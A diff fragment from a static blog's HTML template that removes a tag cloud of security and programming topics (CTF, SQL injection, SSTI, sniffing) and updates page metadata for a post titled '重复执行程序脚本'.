-      <a href="/tags/C/" style="font-size: 14px; color: #999">C</a> <a href="/tags/CTF/" style="font-size: 14px; color: #999">CTF</a> <a href="/tags/CTF-web/" style="font-size: 19px; color: #777">CTF-web</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 14px; color: #999">SSTI</a> <a href="/tags/linux/" style="font-size: 14px; color: #999">linux</a> <a href="/tags/php/" style="font-size: 14px; color: #999">php</a> <a href="/tags/python/" style="font-size: 24px; color: #555">python</a> <a href="/tags/unicode/" style="font-size: 14px; color: #999">unicode</a> <a href="/tags/%E5%97%85%E6%8E%A2/" style="font-size: 14px; color: #999">嗅探</a> <a href="/tags/%E9%87%8D%E5%AE%9A%E5%90%91/" style="font-size: 14px; color: #999">重定向</a>
-    </div>
-  </section>
-
-
-  
 
   
 
 
 </aside>
+
 
 
 		  
@@ -600,8 +760,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="重复执行程序脚本";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
